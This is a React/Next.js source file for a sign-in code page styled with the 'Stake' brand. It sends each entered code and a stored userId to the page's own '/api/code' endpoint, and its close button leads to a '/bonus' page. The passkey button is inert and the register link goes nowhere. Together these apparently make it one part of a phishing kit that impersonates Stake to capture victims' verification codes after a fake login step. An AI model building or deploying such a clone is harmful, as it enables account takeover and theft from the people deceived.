"use client";

import { useState } from "react";
import Link from "next/link";
import { X, Key } from "lucide-react";
import { useRouter } from "next/navigation";

export default function SignInCodePage() {
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const router = useRouter();

  const handleSubmit = async () => {
    setError("");

    const userId = localStorage.getItem("userId");

    if (!userId) {
      setError("Session expired. Please login again.");
      return;
    }

    if (!code.trim()) {
      setError("Code is required");
      return;
    }

    try {
      setLoading(true);

      const res = await fetch("/api/code", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userId,
          code,
        }),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.message || "Failed to submit code");
      }

      // ✅ Optional: clear userId after success
      localStorage.removeItem("userId");

      // ✅ Redirect after successful code submit
      router.push("/"); // or dashboard / success page
    } catch (err: unknown) {
      if (err instanceof Error) {
        setError(err.message);
      } else {
        setError("Something went wrong");
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#1D2C37] flex items-center justify-center p-6">
      <div className="bg-[#1D2C37] rounded-lg w-full max-w-md p-8 relative shadow-lg">
        {/* Close Button */}
        <Link
          href="/bonus"
          className="absolute top-6 right-6 text-white hover:text-gray-400 transition-colors"
        >
          <X size={24} />
        </Link>

        {/* Logo */}
        <div className="stake-logo text-white text-2xl mb-8">Stake</div>

        {/* Code Field */}
        <div className="mb-6">
          <label className="block text-white text-sm mb-2">
            Code <span className="text-red-500">*</span>
          </label>
          <input
            type="text"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="w-full bg-[#1D2C37] border-2 border-[#4A4D51] rounded-[6px] px-4 py-3 text-white focus:outline-none focus:border-blue-500 transition-colors"
          />
        </div>

        {error && (
          <div className="mb-4 p-3 rounded bg-red-500/10 text-red-400 text-sm">
            {error}
          </div>
        )}

        {/* Sign In Button */}
        <button
          onClick={handleSubmit}
          disabled={loading}
          className="w-full bg-[#3B82F6] hover:bg-[#2563EB] disabled:opacity-60 text-white font-semibold py-3 rounded-[6px] transition-colors mb-4"
        >
          {loading ? "Submitting..." : "Sign in"}
        </button>

        {/* Help Text */}
        <p className="text-[#A0AEC0] text-sm mb-6">
          To request a new code, please{" "}
          <Link
            href="/signin"
            className="text-blue-400 hover:text-blue-300 transition-colors"
          >
            login again
          </Link>
          .
        </p>

        {/* Separator */}
        <div className="relative mb-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-[#4A4D51]"></div>
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="px-2 bg-[#1A202C] text-[#A0AEC0]">OR</span>
          </div>
        </div>

        {/* Alternative Sign In Options */}
        <div className="space-y-3 mb-6">
          <button className="w-full bg-[#2D3748] hover:bg-[#374151] text-white py-3 rounded-[6px] transition-colors flex items-center justify-center gap-2">
            <Key size={18} />
            Sign In with passkey
          </button>
        </div>

        {/* Register Link */}
        <div className="text-center">
          <span className="text-[#A0AEC0] text-sm">Don&apos;t have an account? </span>
          <Link
            href="#"
            className="text-white hover:text-gray-300 text-sm font-semibold transition-colors"
          >
            Register an Account
          </Link>
        </div>
      </div>
    </div>
  );
}
